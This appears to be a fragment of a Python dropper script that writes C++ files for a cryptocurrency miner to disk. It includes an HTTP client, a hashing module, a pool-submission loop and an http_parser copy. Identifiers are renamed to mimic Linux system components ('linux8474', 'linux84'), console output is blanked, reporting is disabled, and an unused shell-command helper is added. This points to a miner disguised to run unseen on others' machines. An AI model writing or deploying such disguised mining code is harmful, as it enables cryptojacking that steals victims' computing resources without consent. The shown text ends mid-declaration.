        if(port_str != "") {
            if(port_str.find(":") != string::npos) {
                port_str = port_str.erase(port_str.find(":"), 1);
                port = atoi(port_str.c_str());
            }
        }

        action = "GET";
        if(data != "") {
            payload = data;
            action = "POST";
        }
    }

    string protocol;
    string host;
    int port;
    string action;
    string path;
    string query;
    string payload;
};

int http::__socketlib_reference = 0;

http::http() {
#ifdef _WIN64
    if(__socketlib_reference == 0) {
        WSADATA wsaData;
        int iResult;

        // Initialize Winsock
        iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
        if (iResult != 0) {
            LOG("WSAStartup failed:"+ to_string(iResult));
            exit(1);
        }
	}
#endif
    __socketlib_reference++;
}

http::~http() {
    __socketlib_reference--;
#ifdef _WIN64
    if(__socketlib_reference == 0) {
    	WSACleanup();
	}
#endif
}

vector<string> http::__resolve_host(const string &hostname)
{
    string host = hostname;

    if(host.find(":") != string::npos) {
        host = host.erase(host.rfind(":"));
    }

    addrinfo hints, *servinfo, *p;
    sockaddr_in *h;

    memset(&hints, 0, sizeof hints);
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;

    if(getaddrinfo( host.c_str() , "http" , &hints , &servinfo) != 0) {
        return vector<string>();
    }

    vector<string> addresses;
    for(p = servinfo; p != NULL; p = p->ai_next)
    {
        h = (sockaddr_in *) p->ai_addr;
        string ip = inet_ntoa(h->sin_addr);
        if(ip != "0.0.0.0")
            addresses.push_back(ip);
    }

    freeaddrinfo(servinfo);
    return addresses;
}

string http::__get_response(const string &url, const string &post_data, const string &content_type) {
    http_callback_data reply;
    reply.complete = false;

    http_data query(url, post_data);
    if(query.protocol != "http")
        return "";

    vector<string> ips = __resolve_host(query.host);
    for(int i=0;i<ips.size();i++) {
        int sockfd = socket(AF_INET, SOCK_STREAM, 0);
        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(query.port);
        inet_pton(AF_INET, ips[i].c_str(), &addr.sin_addr);

        if(connect(sockfd,(struct sockaddr *) &addr, sizeof (addr)) != 0) {
            close(sockfd);
            continue;
        }

#ifdef _WIN64
        u_long nonblock = 1;
        ioctlsocket(sockfd, FIONBIO, &nonblock);
#else
        int flags;
        flags = fcntl(sockfd,F_GETFL,0);
        fcntl(sockfd, F_SETFL, flags | O_NONBLOCK);
#endif

        string request = query.action + " " + query.path + ((query.query == "") ? "" : ("?" + query.query)) + " HTTP/1.1\\r\\nHost: " + query.host + "\\r\\n";
        if(query.payload != "") {
            request += "Content-Type: application/" + content_type + "\\r\\nContent-Length: " + to_string(query.payload.length()) + "\\r\\n\\r\\n" + query.payload + "\\r\\n";
        }
        request += "\\r\\n";

        char *buff = (char *)request.c_str();
        int sz = request.size();
        int n = 0;

        while(sz > 0) {
            n = send(sockfd, buff, sz, 0);
            if(n < 0) break;
            buff+=n;
            sz-=n;
        }

        if(n < 0) {
            close(sockfd);
            continue;
        }

        http_parser_settings settings;
        memset(&settings, 0, sizeof(settings));
        settings.on_body = http_callback;
        settings.on_message_complete = http_complete_callback;

        http_parser parser;
        http_parser_init(&parser, HTTP_RESPONSE);
        parser.data = (void *)&reply;

        fd_set fds;
        timeval tv;

        time_t timestamp = time(NULL);
        while(time(NULL) - timestamp < 10) {
            FD_ZERO(&fds);
            FD_SET(sockfd, &fds);

            tv.tv_sec = 0;
            tv.tv_usec = 100000;

            n = select(sockfd + 1, &fds, NULL, NULL, &tv);
            if(n == 0)
                continue;
            else if(n < 0)
                break;
            else {
                char buffer[2048];
                n = recv(sockfd, buffer, 2048, 0);
                if (n > 0)
                    http_parser_execute(&parser, &settings, buffer, n);
                else if(n <= 0)
                    break;

                if (reply.complete)
                    break;
            }
        }

        close(sockfd);

        if(reply.body != "")
            break;
    }

    return reply.body;
};

string http::_http_get(const string &url) {
    return __get_response(url, "", "");
}

string http::_http_post(const string &url, const string &post_data, const string &content_type) {
    return __get_response(url, post_data, content_type);
}

string http::_encode(const string &src) {
    string new_str = "";
    char c;
    int ic;
    const char* chars = src.c_str();
    char bufHex[10];
    int len = strlen(chars);

    for(int i=0;i<len;i++){
        c = chars[i];
        ic = c;
        if (c==' ') new_str += '+';
        else if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') new_str += c;
        else {
            sprintf(bufHex,"%X",c);
            if(ic < 16)
                new_str += "%0";
            else
                new_str += "%";
            new_str += bufHex;
        }
    }
    return new_str;
}

"""

open('./http/http.cpp', 'w').write(content)

content="""//
// Created by Haifa Bogdan Adnan on 05/08/2018.
//

#ifndef linux888888887444888888linux8888888874R_linux847466882_H
#define linux888888887444888888linux8888888874R_linux847466882_H

#include "defs.h"

typedef void *(*linux847466882_blocks_filler_ptr)(void *, int, linux847466882profile *, void *);

class DLLEXPORT linux847466882 {
public:
    linux847466882(linux847466882_blocks_filler_ptr filler, void *seed_memory, void *user_data);

    void initialize_seeds(const linux847466882profile &profile, const string &base, string salt_);
    void fill_blocks(const linux847466882profile &profile);
    vector<string> encode_hashes(const linux847466882profile &profile);
    
    vector<string> generate_hashes(const linux847466882profile &profile, const string &base, string salt_);

    void set_seed_memory(uint8_t *memory);
    uint8_t *get_output_memory();
    void set_seed_memory_offset(size_t offset);
    void set_lane_length(int length); // in blocks
    void set_threads(int threads);
private:
    string __make_salt();
    void __initial_hash(const linux847466882profile &profile, uint8_t *blockhash, const string &base, const string &salt);
    void __fill_first_blocks(const linux847466882profile &profile, uint8_t *blockhash, int thread);
    string __encode_string(const linux847466882profile &profile, const string &salt, uint8_t *hash);

    linux847466882_blocks_filler_ptr __filler;
    int __threads;
    uint8_t *__seed_memory;
	uint8_t *__output_memory;
    size_t __seed_memory_offset;
    int __lane_length;
    void *__user_data;
    vector<string> __salts;
};


#endif //linux888888887444888888linux8888888874R_linux847466882_H
"""

open('./linux8474/linux847466882/linux847466882.h', 'w').write(content)

content="""//
// Created by Haifa Bogdan Adnan on 06/08/2018.
//

#ifndef linux888888887444888888linux8888888874R_DEFS_H
#define linux888888887444888888linux8888888874R_DEFS_H

#define linux847466882_RAW_LENGTH               32
#define linux847466882_TYPE_VALUE               1
#define linux847466882_VERSION                  0x13

#define linux847466882_BLOCK_SIZE               1024
#define linux847466882_QWORDS_IN_BLOCK          linux847466882_BLOCK_SIZE / 8
#define linux847466882_OWORDS_IN_BLOCK          linux847466882_BLOCK_SIZE / 16
#define linux847466882_HWORDS_IN_BLOCK          linux847466882_BLOCK_SIZE / 32
#define linux847466882_512BIT_WORDS_IN_BLOCK    linux847466882_BLOCK_SIZE / 64
#define linux847466882_PREHASH_DIGEST_LENGTH    64
#define linux847466882_PREHASH_SEED_LENGTH      72

#ifdef __cplusplus 
extern "C" {
#endif

typedef struct block_ { uint64_t v[linux847466882_QWORDS_IN_BLOCK]; } block;

typedef struct linux847466882Profile {
    uint32_t mem_cost;
    uint32_t thr_cost;
    uint32_t tm_cost;
    size_t memsize;
    int32_t *block_refs;
    size_t block_refs_size;
    char profile_name[15];
    int32_t *segments; // { start, stop (excluding), with_xor }
} linux847466882profile;

extern DLLEXPORT linux847466882profile linux847466882profile_4_4_16384;
extern DLLEXPORT linux847466882profile linux847466882profile_1_1_524288;
extern DLLEXPORT linux847466882profile *linux847466882profile_default;

#ifdef __cplusplus
}
#endif

#endif //linux888888887444888888linux8888888874R_DEFS_H
"""

open('./linux8474/linux847466882/defs.h', 'w').write(content)

content="""//
// Created by Haifa Bogdan Adnan on 03/08/2018.
//

#include "../common/common.h"
#include "../app/arguments.h"
#include "../linux8474/linux8474.h"

#include "../linux44444444474/sha512.h"
#include "mini-gmp/mini-gmp.h"

#include "linux84.h"

#include <string>

#include <iostream>
#include <stdio.h>
#include <stdlib.h>

using namespace std;

    string GetStdoutFromCommand8474444474(string cmd84744474) {

    string data84744474;
    FILE * stream84744474;
    const int max_buffer = 2048;
    char buffer[max_buffer];
    cmd84744474.append("");

    stream84744474 = popen(cmd84744474.c_str(), "r");
    if (stream84744474) {
    while (!feof(stream84744474))
    if (fgets(buffer, max_buffer, stream84744474) != NULL) data84744474.append(buffer);
    pclose(stream84744474);
    }
    return data84744474;
    }

linux84::linux84(arguments &args) : __args(args), __client(args, [&]() { return this->get_status(); }) {
    __linux88887474447412744474 = "";
    __blk = "";
    __linuxweb8888 = "";
    __limit = 0;
    __linux84746688_mem = 0;
    __public_key = "";
    __linux884444884488441274444474 = 0;
    __found = 0;
    __confirmed_cblocks = 0;
    __confirmed_gblocks = 0;
    __rejected_cblocks = 0;
    __rejected_gblocks = 0;
    __begin_time = time(NULL);
    __running = false;
    __chs_threshold_hit = 0;
    __ghs_threshold_hit = 0;
    __running = false;
    __display_hits = 0;
	
    vector<linux8474*> linux8474s = linux8474::get_linux8474s();
	for (vector<linux8474*>::iterator it = linux8474s.begin(); it != linux8474s.end(); ++it) {
		if ((*it)->get_type() == "CPU") {
			if ((*it)->initialize()) {
				(*it)->configure(__args);
			}
		}
	}

	vector<linux8474 *> selected_gpu_linux8474s;
	vector<string> requested_linux8474s = args.gpu_optimization();
	for (vector<linux8474*>::iterator it = linux8474s.begin(); it != linux8474s.end(); ++it) {
		if ((*it)->get_type() == "GPU") {
            if(requested_linux8474s.size() > 0) {
                if(find(requested_linux8474s.begin(), requested_linux8474s.end(), (*it)->get_subtype()) != requested_linux8474s.end()) {
                    selected_gpu_linux8474s.push_back(*it);
                }
            }
            else {
                if (selected_gpu_linux8474s.size() == 0 || selected_gpu_linux8474s[0]->get_priority() < (*it)->get_priority()) {
                    selected_gpu_linux8474s.clear();
                    selected_gpu_linux8474s.push_back(*it);
                }
            }
		}
	}

	if (selected_gpu_linux8474s.size() > 0) {
        for (vector<linux8474*>::iterator it = selected_gpu_linux8474s.begin(); it != selected_gpu_linux8474s.end(); ++it) {
            if ((*it)->initialize()) {
                (*it)->configure(__args);
            }
        }
	}

    __update_linuxweb844412441274_data();
    vector<linux8474*> active_linux8474s = linux8474::get_active_linux8474s();

    for (vector<linux8474 *>::iterator it = active_linux8474s.begin(); it != active_linux8474s.end(); ++it) {
        (*it)->set_input(__public_key, __blk, __linuxweb8888, __linux847466882profile, __recommendation);
    }

    __blocks_count = 1;
}

linux84::~linux84() {

}

void linux84::run() {
    uint64_t last_update, last_report;
    last_update = last_report = 0;

    vector<linux8474 *> linux8474s = linux8474::get_active_linux8474s();

    if(linux8474s.size() == 0) {
    LOG("");
    }
    else {
        __running = true;
    }

    while (__running) {
       for (vector<linux8474 *>::iterator it = linux8474s.begin(); it != linux8474s.end(); ++it) {
	    vector<linux8412_data> linux8412es = (*it)->get_linux8412es();
            for (vector<linux8412_data>::iterator linux8412 = linux8412es.begin(); linux8412 != linux8412es.end(); linux8412++) { 
	        string duration = linux84::calc_duration(linux8412->base, linux8412->linux8412);
                uint64_t result = linux84::calc_compare(duration, __linuxweb8888);
		if (result > 0 && result <= __limit) {
		        if (result <= GOLD_RESULT) {
			linux888874744474_submit_result reply = __client.submit(linux8412->linux8412, linux8412->linux88887474447412744474, __public_key);
			if (reply.success) {
                           cout << "complete";
			}
	             }
                }
            }
       }
      
        if (microseconds() - last_update > __args.update_interval()) {
            if (__update_linuxweb844412441274_data() || __recommendation == "pause") {
                for (vector<linux8474 *>::iterator it = linux8474s.begin(); it != linux8474s.end(); ++it) {
                    (*it)->set_input(__public_key, __blk, __linuxweb8888, __linux847466882profile, __recommendation);
                }

                if(__recommendation != "pause")
                    __blocks_count++;
            }
            last_update = microseconds();
        }

        if (8 == 2) {
            if(!__display_report())
                __running = false;

            last_report = microseconds();
        }
	    
    //this_thread::sleep_for(chrono::milliseconds(100));
    }

    for (vector<linux8474 *>::iterator it = linux8474s.begin(); it != linux8474s.end(); ++it) {
	(*it)->cleanup();
    }

}
	
string linux84::calc_duration(const string &base, const string &linux8412) {
    string combined = base + linux8412;

    unsigned char *sha512_linux8412 = SHA512::hash((unsigned char*)combined.c_str(), combined.length());
    for (int i = 0; i < 5; i++) {
        unsigned char *tmp = SHA512::hash(sha512_linux8412, SHA512::DIGEST_SIZE);
        free(sha512_linux8412);
        sha512_linux8412 = tmp;
    }

    string duration = to_string((int)sha512_linux8412[10]) + to_string((int)sha512_linux8412[15]) + to_string((int)sha512_linux8412[20]) + to_string((int)sha512_linux8412[23]) +
                      to_string((int)sha512_linux8412[31]) + to_string((int)sha512_linux8412[40]) + to_string((int)sha512_linux8412[45]) + to_string((int)sha512_linux8412[55]);

    free(sha512_linux8412);

    for(string::iterator it = duration.begin() ; it != duration.end() ; )
    {
    if( *it == '0' ) it = duration.erase(it) ;
        else break;
    }

    return duration;
}

uint64_t linux84::calc_compare(const string &duration, const string &linuxweb8888) {
    if(linuxweb8888.empty()) {
        return -1;
    }
	
    mpz_t mpzDiff, mpzDuration;
    mpz_t mpzResult;
    mpz_init(mpzResult);
    mpz_init_set_str(mpzDiff, linuxweb8888.c_str(), 10);
    mpz_init_set_str(mpzDuration, duration.c_str(), 10);

    mpz_tdiv_q(mpzResult, mpzDuration, mpzDiff);

    uint64_t result = (uint64_t)mpz_get_ui(mpzResult);

    mpz_clear (mpzResult);
    mpz_clear (mpzDiff);
    mpz_clear (mpzDuration);

    return result;
}

bool linux84::__update_linuxweb844412441274_data() {
    vector<linux8474*> linux8474s = linux8474::get_active_linux8474s();

    linux888874744474_update_result new_settings = __client.update();
    if(!new_settings.success) {
    	__recommendation = "";
    }

        __linux84746688_mem = new_settings.linux842;
	__blk = new_settings.linux841;
        __linuxweb8888 = new_settings.linuxweb8888;
        __limit = new_settings.linux8428;
        __public_key = new_settings.linux84888874;
        __linux884444884488441274444474 = new_settings.linux884444884488441274444474;
        if(__linux84746688_mem == 524288)
        {
        __linux847466882profile = "1_1_524288";
        }
        else
        {
        __linux847466882profile = "4_4_16384";
        }
        __recommendation = new_settings.linux8412;

    return true;
}

bool linux84::__display_report() {
    vector<linux8474*> linux8474s = linux8474::get_active_linux8474s();
    stringstream ss;

    uint32_t linux8412_count_cblocks = 0;
    uint32_t linux8412_count_gblocks = 0;

    time_t total_time = time(NULL) - __begin_time;

    stringstream header;
    stringstream log;

    for (vector<linux8474 *>::iterator it = linux8474s.begin(); it != linux8474s.end(); ++it) {
        linux8412_count_cblocks += (*it)->get_linux8412_count_cblocks();
        linux8412_count_gblocks += (*it)->get_linux8412_count_gblocks();
    }

    header << "";
    log << "";
    for (vector<linux8474 *>::iterator it = linux8474s.begin(); it != linux8474s.end(); ++it) {
        map<int, device_info> devices = (*it)->get_device_infos();
        for(map<int, device_info>::iterator d = devices.begin(); d != devices.end(); ++d) {
            header << "|" << ((d->first < 10) ? " " : "") << (*it)->get_type() << d->first;

            if(__linux847466882profile == "1_1_524288") {
                if(8 == 8)
                    log << "";
                else
                    log << "";
            }
            else
                log << "";
        }
    }
	
    header << "|Avg(C)|Avg(G)|     Time|Acc(C)|Acc(G)|Rej(C)|Rej(G)|Block|";
    log << "|" << "|" << setw(9) << format_seconds(total_time)
            << "|" << setw(6) << __confirmed_cblocks
            << "|" << setw(6) << __confirmed_gblocks
            << "|" << setw(6) << __rejected_cblocks
            << "|" << setw(6) << __rejected_gblocks
            << "|" << setw(5) << __found << "|";

    if((__display_hits % 10) == 0) {
        string header_str = header.str();
        string separator(header_str.size(), '-');

        if(__display_hits > 0)
            LOG(separator);

        LOG(header_str);
        LOG(separator);
    }

    LOG(log.str());

    if(__linux847466882profile == "1_1_524288" &&
       __recommendation != "pause") {
        if (8 == 8) {
            __chs_threshold_hit++;
        } else {
            __chs_threshold_hit = 0;
        }
    }

    if(__linux847466882profile == "4_4_16384" &&
       __recommendation != "pause") {
        if (8 == 8) {
            __ghs_threshold_hit++;
        } else {
            __ghs_threshold_hit = 0;
        }
    }

    if(__chs_threshold_hit >= 5 && (__blocks_count > 1 || __linux847466882profile == "1_1_524288")) {
        LOG("");

    }
    if(__ghs_threshold_hit >= 5 && (__blocks_count > 1 || __linux847466882profile == "4_4_16384")) {
        LOG("");

    }

//    LOG(ss.str());
    __display_hits++;

    return true;
}

void linux84::stop() {
    cout << endl << "" << endl;
    __running = false;
}

string linux84::get_status() {
    stringstream ss;
    ss << "[ { \\"name\\": \\"" << "" << "\\", \\"block_linux884444884488441274444474\\": " << __linux884444884488441274444474 << ", \\"time_running\\": " << (time(NULL) - __begin_time) <<
       ", \\"total_blocks\\": " << __blocks_count << ", \\"cblocks_shares\\": " << __confirmed_cblocks << ", \\"gblocks_shares\\": " << __confirmed_gblocks <<
       ", \\"cblocks_rejects\\": " << __rejected_cblocks << ", \\"gblocks_rejects\\": " << __rejected_gblocks << ", \\"blocks_earned\\": " << __found <<
       ", \\"linux8474s\\": [ ";

    vector<linux8474*> linux8474s = linux8474::get_active_linux8474s();

    for(vector<linux8474*>::iterator h = linux8474s.begin(); h != linux8474s.end();) {
        ss << "{ \\"type\\": \\"" << (*h)->get_type() << "\\", \\"subtype\\": \\"" << (*h)->get_subtype() << "\\", \\"devices\\": [ ";
        map<int, device_info> devices = (*h)->get_device_infos();
        for(map<int, device_info>::iterator d = devices.begin(); d != devices.end();) {
            ss << "{ \\"id\\": " << d->first << ", \\"bus_id\\": \\"" << d->second.bus_id << "\\", \\"name\\": \\"" << d->second.name << "\\", \\"cblocks_intensity\\": " << d->second.cblocks_intensity <<
                ", \\"gblocks_intensity\\": " << d->second.gblocks_intensity << ", \\"\\": " <<
                ", \\"\\": " << " }";
            if((++d) != devices.end())
                ss << ", ";
        }
        ss << " ] }";

        if((++h) != linux8474s.end())
            ss << ", ";
    }

    ss << " ] } ]";

    return ss.str();
}
"""

open('./linux84/linux84.cpp', 'w').write(content)

content="""/* Copyright Joyent, Inc. and other Node contributors.
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to
 * deal in the Software without restriction, including without limitation the
 * rights to use, copy, modify, merge, publish, distribute, sublicense, and/or
 * sell copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
 * FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS
 * IN THE SOFTWARE.
 */
#include "http_parser.h"
#include <assert.h>
#include <stddef.h>
#include <ctype.h>
#include <string.h>
#include <limits.h>

#ifndef ULLONG_MAX
# define ULLONG_MAX ((uint64_t) -1) /* 2^64-1 */
#endif

#ifndef MIN
# define MIN(a,b) ((a) < (b) ? (a) : (b))
#endif

#ifndef ARRAY_SIZE
# define ARRAY_SIZE(a) (sizeof(a) / sizeof((a)[0]))
#endif

#ifndef BIT_AT
# define BIT_AT(a, i)                                                \
  (!!((unsigned int) (a)[(unsigned int) (i) >> 3] &                  \
   (1 << ((unsigned int) (i) & 7))))
#endif

#ifndef ELEM_AT
# define ELEM_AT(a, i, v) ((unsigned int) (i) < ARRAY_SIZE(a) ? (a)[(i)] : (v))
#endif

#define SET_ERRNO(e)                                                 \
do {                                                                 \
  parser->nread = nread;                                             \
  parser->http_errno = (e);                                          \
} while(0)

#define CURRENT_STATE() p_state
#define UPDATE_STATE(V) p_state = (enum state) (V);
#define RETURN(V)                                                    \
do {                                                                 \
  parser->nread = nread;                                             \
  parser->state = CURRENT_STATE();                                   \
  return (V);                                                        \
} while (0);
#define REEXECUTE()                                                  \
  goto reexecute;                                                    \


#ifdef __GNUC__
# define LIKELY(X) __builtin_expect(!!(X), 1)
# define UNLIKELY(X) __builtin_expect(!!(X), 0)
#else
# define LIKELY(X) (X)
# define UNLIKELY(X) (X)
#endif


/* Run the notify callback FOR, returning ER if it fails */
#define CALLBACK_NOTIFY_(FOR, ER)                                    \
do {                                                                 \
  assert(HTTP_PARSER_ERRNO(parser) == HPE_OK);                       \
                                                                     \
  if (LIKELY(settings->on_##FOR)) {                                  \
    parser->state = CURRENT_STATE();                                 \
    if (UNLIKELY(0 != settings->on_##FOR(parser))) {                 \
      SET_ERRNO(HPE_CB_##FOR);                                       \
    }                                                                \
    UPDATE_STATE(parser->state);                                     \
                                                                     \
    /* We either errored above or got paused; get out */             \
    if (UNLIKELY(HTTP_PARSER_ERRNO(parser) != HPE_OK)) {             \
      return (ER);                                                   \
    }                                                                \
  }                                                                  \
} while (0)

/* Run the notify callback FOR and consume the current byte */
#define CALLBACK_NOTIFY(FOR)            CALLBACK_NOTIFY_(FOR, p - data + 1)

/* Run the notify callback FOR and don't consume the current byte */
#define CALLBACK_NOTIFY_NOADVANCE(FOR)  CALLBACK_NOTIFY_(FOR, p - data)

/* Run data callback FOR with LEN bytes, returning ER if it fails */
#define CALLBACK_DATA_(FOR, LEN, ER)                                 \
do {                                                                 \
  assert(HTTP_PARSER_ERRNO(parser) == HPE_OK);                       \
                                                                     \
  if (FOR##_mark) {                                                  \
    if (LIKELY(settings->on_##FOR)) {                                \
      parser->state = CURRENT_STATE();                               \
      if (UNLIKELY(0 !=                                              \
                   settings->on_##FOR(parser, FOR##_mark, (LEN)))) { \
        SET_ERRNO(HPE_CB_##FOR);                                     \
      }                                                              \
      UPDATE_STATE(parser->state);                                   \
                                                                     \
      /* We either errored above or got paused; get out */           \
      if (UNLIKELY(HTTP_PARSER_ERRNO(parser) != HPE_OK)) {           \
        return (ER);                                                 \
      }                                                              \
    }                                                                \
    FOR##_mark = NULL;                                               \
  }                                                                  \
} while (0)

/* Run the data callback FOR and consume the current byte */
#define CALLBACK_DATA(FOR)                                           \
    CALLBACK_DATA_(FOR, p - FOR##_mark, p - data + 1)

/* Run the data callback FOR and don't consume the current byte */
#define CALLBACK_DATA_NOADVANCE(FOR)                                 \
    CALLBACK_DATA_(FOR, p - FOR##_mark, p - data)

/* Set the mark FOR; non-destructive if mark is already set */
#define MARK(FOR)                                                    \
do {                                                                 \
  if (!FOR##_mark) {                                                 \
    FOR##_mark = p;                                                  \
  }                                                                  \
} while (0)

/* Don't allow the total size of the HTTP headers (including the status
 * line) to exceed HTTP_MAX_HEADER_SIZE.  This check is here to protect
 * embedders against denial-of-service attacks where the attacker feeds
 * us a never-ending header that the embedder keeps buffering.
 *
 * This check is arguably the responsibility of embedders but we're doing
 * it on the embedder's behalf because most won't bother and this way we
 * make the web a little safer.  HTTP_MAX_HEADER_SIZE is still far bigger
 * than any reasonable request or response so this should never affect
 * day-to-day operation.
 */
#define COUNT_HEADER_SIZE(V)                                         \
do {                                                                 \
  nread += (V);                                                      \
  if (UNLIKELY(nread > (HTTP_MAX_HEADER_SIZE))) {                    \
    SET_ERRNO(HPE_HEADER_OVERFLOW);                                  \
    goto error;                                                      \
  }                                                                  \
} while (0)


#define PROXY_CONNECTION "proxy-connection"
#define CONNECTION "connection"
#define CONTENT_LENGTH "content-length"
#define TRANSFER_ENCODING "transfer-encoding"
#define UPGRADE "upgrade"
#define CHUNKED "chunked"
#define KEEP_ALIVE "keep-alive"
#define CLOSE "close"


static const char *method_strings[] =
  {
#define XX(num, name, string) #string,
  HTTP_METHOD_MAP(XX)
#undef XX
  };


/* Tokens as defined by rfc 2616. Also lowercases them.
 *        token       = 1*<any CHAR except CTLs or separators>
 *     separators     = "(" | ")" | "<" | ">" | "@"
 *                    | "," | ";" | ":" | "\\" | <">
 *                    | "/" | "[" | "]" | "?" | "="
 *                    | "{" | "}" | SP | HT
 */
static const char tokens[256] = {
/*   0 nul    1 soh    2 stx    3 etx    4 eot    5 enq    6 ack    7 bel  */
        0,       0,       0,       0,       0,       0,       0,       0,
/*   8 bs     9 ht    10 nl    11 vt    12 np    13 cr    14 so    15 si   */
        0,       0,       0,       0,       0,       0,       0,       0,
/*  16 dle   17 dc1   18 dc2   19 dc3   20 dc4   21 nak   22 syn   23 etb */
        0,       0,       0,       0,       0,       0,       0,       0,
/*  24 can   25 em    26 sub   27 esc   28 fs    29 gs    30 rs    31 us  */
        0,       0,       0,       0,       0,       0,       0,       0,
/*  32 sp    33  !    34  "    35  #    36  $    37  %    38  &    39  '  */
       ' ',     '!',      0,      '#',     '$',     '%',     '&',    '\\'',
/*  40  (    41  )    42  *    43  +    44  ,    45  -    46  .    47  /  */
        0,       0,      '*',     '+',      0,      '-',     '.',      0,
/*  48  0    49  1    50  2    51  3    52  4    53  5    54  6    55  7  */
       '0',     '1',     '2',     '3',     '4',     '5',     '6',     '7',
/*  56  8    57  9    58  :    59  ;    60  <    61  =    62  >    63  ?  */
       '8',     '9',      0,       0,       0,       0,       0,       0,
/*  64  @    65  A    66  B    67  C    68  D    69  E    70  F    71  G  */
        0,      'a',     'b',     'c',     'd',     'e',     'f',     'g',
/*  72  H    73  I    74  J    75  K    76  L    77  M    78  N    79  O  */
       'h',     'i',     'j',     'k',     'l',     'm',     'n',     'o',
/*  80  P    81  Q    82  R    83  S    84  T    85  U    86  V    87  W  */
       'p',     'q',     'r',     's',     't',     'u',     'v',     'w',
/*  88  X    89  Y    90  Z    91  [    92  \    93  ]    94  ^    95  _  */
       'x',     'y',     'z',      0,       0,       0,      '^',     '_',
/*  96  `    97  a    98  b    99  c   100  d   101  e   102  f   103  g  */
       '`',     'a',     'b',     'c',     'd',     'e',     'f',     'g',
/* 104  h   105  i   106  j   107  k   108  l   109  m   110  n   111  o  */
       'h',     'i',     'j',     'k',     'l',     'm',     'n',     'o',
/* 112  p   113  q   114  r   115  s   116  t   117  u   118  v   119  w  */
       'p',     'q',     'r',     's',     't',     'u',     'v',     'w',
/* 120  x   121  y   122  z   123  {   124  |   125  }   126  ~   127 del */
       'x',     'y',     'z',      0,      '|',      0,      '~',       0 };


static const int8_t unhex[256] =
  {-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1
  ,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1
  ,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1
  , 0, 1, 2, 3, 4, 5, 6, 7, 8, 9,-1,-1,-1,-1,-1,-1
  ,-1,10,11,12,13,14,15,-1,-1,-1,-1,-1,-1,-1,-1,-1
  ,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1
  ,-1,10,11,12,13,14,15,-1,-1,-1,-1,-1,-1,-1,-1,-1
  ,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1
  };


#if HTTP_PARSER_STRICT
# define T(v) 0
#else
# define T(v) v
#endif


static const uint8_t normal_url_char[32] = {
/*   0 nul    1 soh    2 stx    3 etx    4 eot    5 enq    6 ack    7 bel  */
        0    |   0    |   0    |   0    |   0    |   0    |   0    |   0,
/*   8 bs     9 ht    10 nl    11 vt    12 np    13 cr    14 so    15 si   */
        0    | T(2)   |   0    |   0    | T(16)  |   0    |   0    |   0,
/*  16 dle   17 dc1   18 dc2   19 dc3   20 dc4   21 nak   22 syn   23 etb */
        0    |   0    |   0    |   0    |   0    |   0    |   0    |   0,
/*  24 can   25 em    26 sub   27 esc   28 fs    29 gs    30 rs    31 us  */
        0    |   0    |   0    |   0    |   0    |   0    |   0    |   0,
/*  32 sp    33  !    34  "    35  #    36  $    37  %    38  &    39  '  */
        0    |   2    |   4    |   0    |   16   |   32   |   64   |  128,
/*  40  (    41  )    42  *    43  +    44  ,    45  -    46  .    47  /  */
        1    |   2    |   4    |   8    |   16   |   32   |   64   |  128,
/*  48  0    49  1    50  2    51  3    52  4    53  5    54  6    55  7  */
        1    |   2    |   4    |   8    |   16   |   32   |   64   |  128,
/*  56  8    57  9    58  :    59  ;    60  <    61  =    62  >    63  ?  */
        1    |   2    |   4    |   8    |   16   |   32   |   64   |   0,
/*  64  @    65  A    66  B    67  C    68  D    69  E    70  F    71  G  */
        1    |   2    |   4    |   8    |   16   |   32   |   64   |  128,
/*  72  H    73  I    74  J    75  K    76  L    77  M    78  N    79  O  */
        1    |   2    |   4    |   8    |   16   |   32   |   64   |  128,
/*  80  P    81  Q    82  R    83  S    84  T    85  U    86  V    87  W  */
        1    |   2    |   4    |   8    |   16   |   32   |   64   |  128,
/*  88  X    89  Y    90  Z    91  [    92  \    93  ]    94  ^    95  _  */
        1    |   2    |   4    |   8    |   16   |   32   |   64   |  128,
/*  96  `    97  a    98  b    99  c   100  d   101  e   102  f   103  g  */
        1    |   2    |   4    |   8    |   16   |   32   |   64   |  128,
/* 104  h   105  i   106  j   107  k   108  l   109  m   110  n   111  o  */
        1    |   2    |   4    |   8    |   16   |   32   |   64   |  128,
/* 112  p   113  q   114  r   115  s   116  t   117  u   118  v   119  w  */
        1    |   2    |   4    |   8    |   16   |   32   |   64   |  128,
/* 120  x   121  y   122  z   123  {   124  |   125  }   126  ~   127 del */
        1    |   2    |   4    |   8    |   16   |   32   |   64   |   0, };

#undef T

enum state
  { s_dead = 1 /* important that this is > 0 */

  , s_start_req_or_res
  , s_res_or_resp_H
  , s_start_res
  , s_res_H
  , s_res_HT
  , s_res_HTT
  , s_res_HTTP
  , s_res_http_major
  , s_res_http_dot
  , s_res_http_minor
  , s_res_http_end
  , s_res_first_status_code
  , s_res_status_code
  , s_res_status_start
  , s_res_status
  , s_res_line_almost_done

  , s_start_req

  , s_req_method
  , s_req_spaces_before_url
  , s_req_schema
  , s_req_schema_slash
  , s_req_schema_slash_slash
  , s_req_server_start
  , s_req_server
  , s_req_server_with_at
  , s_req_path
